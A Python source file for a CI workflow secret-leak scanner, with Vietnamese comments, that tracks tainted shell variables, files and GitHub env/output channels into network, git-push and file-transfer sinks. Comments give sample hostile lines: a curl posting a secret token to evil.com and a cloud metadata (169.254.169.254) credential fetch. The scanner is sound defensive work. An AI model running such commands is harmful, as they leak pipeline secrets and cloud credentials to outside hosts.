import re

from catalogs import (
    CLI_SINK_PATTERN,
    DNS_SINK_PATTERN,
    VAR_REF_PATTERN,
    SECRET_PATTERN,
    RAW_SOCKET_CMDS,
    IMDS_ENDPOINT_PATTERN,
    DYNAMIC_CRED_PATTERN,
    SCM_SINK_PATTERN,
    GIT_ADD_PATTERN,
    GIT_COMMIT_ALL_PATTERN,
    REDIRECT_PATTERN,
    TEE_PATTERN,
    GITHUB_CHANNEL_WRITE_PATTERN,
    FILE_TRANSFER_PATTERN,
    REMOTE_TARGET_PATTERN,
)
from engine.common import classify_source, classify_sink, calculate_risk
from engine.models import (
    DetectionResult,
    FINDING_EXFIL,
    FINDING_EXPOSURE,
    FINDING_INFO,
    FINDING_CREDENTIAL_EXCHANGE,
    FINDING_FILE_EXFIL,
)
from engine.arg_roles import (
    evaluate_cli_flow,
    tokenize,
    find_secret,
    find_source,
    find_tainted_ref,
    iter_references,
    step_output_key,
)
from engine.file_taint import (
    FileTaintState,
    apply_write_redirects,
    apply_trace_tools,
)

# evaluate_cli_flow tra ve verdict; anh xa sang finding_type cua models.
# Analyzer emit TAT CA, viec loc do config.should_report quyet dinh. Nho vay
# che do audit thay duoc ca INFO, con che do benchmark thi khong.
VERDICT_TO_FINDING = {
    "EXFIL": FINDING_EXFIL,
    "BENIGN_DESTINATION": FINDING_INFO,
    "CREDENTIAL_EXCHANGE": FINDING_CREDENTIAL_EXCHANGE,
}


class BashAnalyzer:
    def analyze(self, lines, tainted_env, context_name="bash", file_state=None,
                step_id=None, exported=None):
        """
        file_state : FileTaintState dung chung o pham vi JOB (sua tai cho).
        step_id    : gia tri `id:` cua step, can de dat khoa step output.
        exported   : dict duoc sua tai cho, chua taint can day len pham vi JOB
                     ($GITHUB_ENV va $GITHUB_OUTPUT).
        """
        tainted = tainted_env.copy()
        if file_state is None:
            file_state = FileTaintState()
        if exported is None:
            exported = {}
        detections = []

        for line in lines:
            line_str = line.strip()

            # ------------------------------------------------------------------
            # 1. Variable assignment tracking: VAR=...
            # ------------------------------------------------------------------
            assignment = re.match(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)", line_str)
            if assignment:
                var, expr = assignment.group(1), assignment.group(2)
                secret = find_source(expr)
                if secret is None:
                    raw = SECRET_PATTERN.search(expr)
                    secret = raw.group() if raw else None

                if secret:
                    tainted[var] = {
                        "Source": secret,
                        "Path": [secret, f"{context_name}.{var}"],
                    }
                else:
                    for name in iter_references(expr):
                        if name in tainted:
                            tainted[var] = {
                                "Source": tainted[name]["Source"],
                                "Path": tainted[name]["Path"]
                                + [f"{context_name}.{var}"],
                            }
                            break

            # ------------------------------------------------------------------
            # 1b. RULE-SRC-02 (S_dyn): credential dong tu IMDS / CLI cloud.
            #     VAR=$(curl http://169.254.169.254/...)  ->  VAR la S_dyn.
            # ------------------------------------------------------------------
            if assignment:
                var, expr = assignment.group(1), assignment.group(2)
                if var not in tainted:
                    imds = IMDS_ENDPOINT_PATTERN.search(expr)
                    dyn = DYNAMIC_CRED_PATTERN.search(expr)
                    if imds or dyn:
                        origin = (imds or dyn).group(0)
                        source = f"dynamic:{origin}"
                        tainted[var] = {
                            "Source": source,
                            "Path": [source, f"{context_name}.{var}"],
                        }

            # ------------------------------------------------------------------
            # 1b-2. RULE T_3 mo rong: $GITHUB_ENV va $GITHUB_OUTPUT.
            #
            #   step N   : echo "K=${{ secrets.X }}" >> $GITHUB_ENV
            #   step N+1 : curl -d "$K" ...
            #
            # Taint phai vuot RANH GIOI STEP. `exported` duoc yaml_analyzer
            # gop len pham vi job sau khi step chay xong.
            # ------------------------------------------------------------------
            gh_write = GITHUB_CHANNEL_WRITE_PATTERN.search(line_str)
            if gh_write:
                key, value, channel = (
                    gh_write.group(1), gh_write.group(2), gh_write.group(3)
                )
                src = find_source(value)
                ref = find_tainted_ref(value, tainted)
                info = None
                if src:
                    info = {"Source": src, "Path": [src]}
                elif ref:
                    info = dict(tainted[ref])

                if info:
                    if channel == "OUTPUT" and step_id:
                        name = step_output_key(step_id, key)
                    else:
                        name = key
                    exported[name] = {
                        "Source": info["Source"],
                        "Path": info["Path"] + [f"GITHUB_{channel}.{name}"],
                    }
                    tainted[name] = exported[name]

            # ------------------------------------------------------------------
            # 1c. Taint cap FILE: `> f`, `>> f`, `| tee f`, trace tool.
            # ------------------------------------------------------------------
            apply_write_redirects(
                line_str, tainted, file_state,
                REDIRECT_PATTERN, TEE_PATTERN, find_source, find_tainted_ref,
            )
            apply_trace_tools(line_str, tainted, file_state)

            # ------------------------------------------------------------------
            # 1d. RULE-SNK-05 (K_scm): git add -> staging, git push -> publish.
            # ------------------------------------------------------------------
            for add_match in GIT_ADD_PATTERN.finditer(line_str):
                for pattern in add_match.group(1).split():
                    file_state.stage(pattern)
            if GIT_COMMIT_ALL_PATTERN.search(line_str):
                file_state.stage_all()

            scm_match = SCM_SINK_PATTERN.search(line_str)
            if scm_match:
                scm_cmd = next((g for g in scm_match.groups() if g), None)
                staged = file_state.take_staged() if scm_cmd else []

                for path, info in staged:
                    score, level = calculate_risk(
                        classify_source(info["Source"]), "K_scm",
                        "untrusted_external",
                    )
                    detections.append(
                        DetectionResult(
                            source=info["Source"],
                            source_category=classify_source(info["Source"]),
                            sink=scm_cmd,
                            sink_category="K_scm",
                            destination_type="untrusted_external",
                            risk_score=score,
                            risk_level=level,
                            command=line_str,
                            context=context_name,
                            path=info["Path"] + [scm_cmd],
                            finding_type=FINDING_EXPOSURE,
                            note=f"File tainted '{path}' bi publish qua {scm_cmd}.",
                        )
                    )

            # ------------------------------------------------------------------
            # 1e. RULE-SNK-07 (K_file): ho file transfer.
            #
            #   scp / rsync / gsutil cp / azcopy / aws s3 cp / gh release
            #   upload / curl -T
            #
            # Payload cua chung la DUONG DAN FILE, nen phai doi chieu voi
            # FileTaintState. Tim bien trong argv se khong thay gi ca - do la
            # ly do ca 5 sink nay truoc day deu bo sot.
            # ------------------------------------------------------------------
            ft_match = FILE_TRANSFER_PATTERN.search(line_str)
            if ft_match:
                ft_cmd = next((g for g in ft_match.groups() if g), None)
                reported = set()
                for token in tokenize(line_str):
                    if token.startswith("-") or REMOTE_TARGET_PATTERN.search(token):
                        continue
                    for path, info in file_state.match(token):
                        if path in reported:
                            continue
                        reported.add(path)
                        s_cat = classify_source(info["Source"])
                        score, level = calculate_risk(
                            s_cat, "K_file", "untrusted_external"
                        )
                        detections.append(
                            DetectionResult(
                                source=info["Source"],
                                source_category=s_cat,
                                sink=ft_cmd,
                                sink_category="K_file",
                                destination_type="untrusted_external",
                                risk_score=score,
                                risk_level=level,
                                command=line_str,
                                context=context_name,
                                path=info["Path"] + [ft_cmd],
                                finding_type=FINDING_FILE_EXFIL,
                                note=(
                                    f"File tainted '{path}' duoc chuyen ra ngoai "
                                    f"qua {ft_cmd}."
                                ),
                            )
                        )

            # ------------------------------------------------------------------
            # 2. Sink check
            #
            # THAY DOI CHINH: khong con hoi "secret co xuat hien tren dong nay
            # khong". evaluate_cli_flow phan tich VI TRI cua secret trong argv:
            #
            #   curl -d '{"text":"ok"}' $SECRET_WEBHOOK   -> INFO  (dich den)
            #   curl -d "$SECRET_TOKEN" https://evil.com  -> EXFIL (payload)
            # ------------------------------------------------------------------
            sink_match = CLI_SINK_PATTERN.search(line_str) or DNS_SINK_PATTERN.search(
                line_str
            )
            if not sink_match:
                continue

            sink_cmd = next((g for g in sink_match.groups() if g), None)
            if not sink_cmd:
                continue

            flow = evaluate_cli_flow(line_str, sink_cmd, tainted)
            if flow is None:
                continue

            finding_type = VERDICT_TO_FINDING.get(flow["verdict"], FINDING_EXFIL)

            source_category = classify_source(flow["source"])
            sink_category = (
                "K_raw" if sink_cmd in RAW_SOCKET_CMDS else classify_sink(sink_cmd)
            )
            destination_type = flow["destination_type"]
            score, level = calculate_risk(
                source_category, sink_category, destination_type
            )

            detections.append(
                DetectionResult(
                    source=flow["source"],
                    source_category=source_category,
                    sink=sink_cmd,
                    sink_category=sink_category,
                    destination_type=destination_type,
                    risk_score=score,
                    risk_level=level,
                    command=line_str,
                    context=context_name,
                    path=flow["path"],
                    finding_type=finding_type,
                    note=flow["note"],
                )
            )

        return tainted, detections